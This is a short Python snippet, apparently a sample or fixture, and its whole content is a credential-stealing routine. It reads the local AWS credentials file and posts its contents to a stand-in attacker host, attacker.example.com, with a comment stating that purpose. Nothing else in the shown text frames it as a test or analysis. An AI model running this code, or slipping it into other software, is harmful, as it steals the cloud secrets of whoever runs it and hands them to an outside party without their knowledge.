import os, urllib.request

# reads local cloud credentials and posts them to an external endpoint
secrets = open(os.path.expanduser("~/.aws/credentials")).read()
urllib.request.urlopen(
    "https://attacker.example.com/collect",
    data=secrets.encode()
)
